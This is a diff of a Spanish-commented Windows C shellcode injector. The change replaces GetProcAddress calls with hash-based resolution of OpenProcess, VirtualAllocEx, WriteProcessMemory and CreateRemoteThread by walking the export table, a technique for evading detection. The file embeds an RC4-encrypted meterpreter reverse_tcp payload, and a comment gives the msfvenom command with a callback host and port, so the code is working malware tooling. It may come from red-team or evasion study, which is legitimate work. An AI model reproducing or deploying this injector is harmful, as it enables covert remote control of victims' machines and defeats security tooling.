@@ -1,6 +1,52 @@
 #include <windows.h>
 #include <stdio.h>
 
+
+DWORD hasher(char *funcion) {
+
+    DWORD hash = 0x666;
+
+    for(int i = 0; i < strlen(funcion); i++) {
+        hash = (hash * 0xDEADB33F + funcion[i]); 
+    }
+
+    return hash;
+}
+
+PDWORD getFunctionByHash(char *DLL, DWORD hash) {
+    PDWORD functionAddress = (PDWORD)0;
+
+	HMODULE libraryBase = LoadLibraryA(DLL);
+
+	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
+	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
+	
+	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
+	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
+	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
+	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);
+
+	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
+	{
+		DWORD functionNameRVA = addressOfNamesRVA[i];
+		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
+		char* functionName = (char*)functionNameVA;
+		DWORD_PTR functionAddressRVA = 0;
+
+		DWORD functionNameHash = hasher(functionName);
+		
+		if (functionNameHash == hash)
+		{
+			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
+			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
+			printf("\n[+] Direccion de %s encontrada en: 0x%x : %p", functionName, functionNameHash, functionAddress);
+			return functionAddress;
+		}
+	}
+}
+
+
 #define ARRAY_LENGTH	256
 
 typedef HANDLE	(WINAPI *EOpenProcess)			(DWORD, BOOL, DWORD);
@@ -87,7 +133,7 @@ int main(int argc, char *argv[]) {
 
     //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.147.139 LPORT=443 --encrypt rc4 --encrypt-key inc0d3 -f c
     unsigned char payload[] = 
-                           "\x88\xa1\x26\x40\xb5\x38\xd1\xcc\xf0\x6f\x95\x33\x33\x24\x60"
+                            "\x88\xa1\x26\x40\xb5\x38\xd1\xcc\xf0\x6f\x95\x33\x33\x24\x60"
                             "\x97\xfb\x45\x88\xe2\x99\xa1\xce\xdb\xd0\x39\x07\x97\x0d\xe9"
                             "\x6a\x1a\x81\x59\x97\xe4\xee\x10\x4e\x36\x26\x3d\x3e\x94\x29"
                             "\x04\x22\x56\xbb\xba\x7f\xad\x63\xdc\x13\xfc\x34\x48\x6d\x98"
@@ -123,36 +169,12 @@ int main(int argc, char *argv[]) {
                             "\x8c\x08\x3f\x07\x0d\x44\xfd\x11\x8e\x65\xb4\x53\x79\x52\x49";
 
 
-    HMODULE kernel = GetModuleHandle("kernel32.dll");
-
-    if (kernel == NULL) {
-        printf("\nError al obtener el modulo:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] Modulo Kernel32 controlado correctamente en 0x%p", kernel);
-
-
-
-    FARPROC loadLib = GetProcAddress(kernel, "LoadLibraryA");
-
-    
-    if (loadLib == NULL) {
-        printf("\nError al obtener la direccion de loadlibrary:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] LoadLibrary controlado correctamente en 0x%p", loadLib);
-
-
-    EOpenProcess openProc = (EOpenProcess)GetProcAddress(kernel, "OpenProcess");
-
-    if (openProc == NULL) {
-        printf("\nError al obtener la direccion de OpenProcess:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] OpenProcess controlado correctamente en 0x%p", openProc);
+    PDWORD funcOpenProcess = getFunctionByHash((char *)"kernel32", 0x55dadd3f);
+    PDWORD funcVirtualAloc = getFunctionByHash((char *)"kernel32", 0x43db2923);
+    PDWORD funcWriteMemory = getFunctionByHash((char *)"kernel32", 0x37b6e3d7);
+    PDWORD funcCreateThrea = getFunctionByHash((char *)"kernel32", 0x697ef192);
+        
+    EOpenProcess openProc = (EOpenProcess)funcOpenProcess;
 
     HANDLE p = openProc(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, atoi(argv[1]));
     if (p == NULL) {
@@ -163,15 +185,7 @@ int main(int argc, char *argv[]) {
     printf("\n[+] Proceso controlado correctamente en 0x%p", p);
 
 
-    EVirtualAllocEx eVirtualAlloc = (EVirtualAllocEx)GetProcAddress(kernel, "VirtualAllocEx");
-
-    if (eVirtualAlloc == NULL) {
-        printf("\nError al obtener la direccion de VirtualAllocEx:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] VirtualAllocEx controlado correctamente en 0x%p", eVirtualAlloc);
-
+    EVirtualAllocEx eVirtualAlloc = (EVirtualAllocEx)funcVirtualAloc;
 
     LPVOID vAlloc = eVirtualAlloc(p, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
     if (vAlloc == NULL) {
@@ -187,7 +201,7 @@ int main(int argc, char *argv[]) {
 	
 	DoKSA("inc0d3", 6);
 
-    printf("\n[+] Tamano del payload %i ", sizeof(payload));
+    printf("\n[+] Tamano del payload %i \n", sizeof(payload));
 
     for(size_t i = 0, len = sizeof(payload) - 1; i < len; i++) {
         keystream_byte = GetPRGAOutput();
@@ -195,18 +209,9 @@ int main(int argc, char *argv[]) {
         //printf("\\x%02hhX", payload[i]);
     }
     
-    
-    EWriteProcessMemory eWrite = (EWriteProcessMemory)GetProcAddress(kernel, "WriteProcessMemory");
+   
+    EWriteProcessMemory eWrite = (EWriteProcessMemory)funcWriteMemory;
 
-    if (eWrite == NULL) {
-        printf("\nError al obtener la direccion de WriteProcessMemory:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] WriteProcessMemory controlado correctamente en 0x%p", eWrite);
-
-
-      
     BOOL result = eWrite(p, vAlloc, payload, sizeof(payload), NULL);
 
     if (result == FALSE) {
@@ -215,16 +220,8 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     printf("\n[+] Shellcode copiada en la memoria del proceso correctamente");
-
-     
-    ECreateRemoteThread eCreate = (ECreateRemoteThread)GetProcAddress(kernel, "CreateRemoteThread");
-
-    if (eCreate == NULL) {
-        printf("\nError al obtener la direccion de CreateRemoteThread:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] CreateRemoteThread controlado correctamente en 0x%p", eCreate);
+       
+    ECreateRemoteThread eCreate = (ECreateRemoteThread)funcCreateThrea;
 
     HANDLE remoteThread = eCreate(p, NULL, 0, (LPTHREAD_START_ROUTINE)vAlloc, NULL, 0, NULL);
 
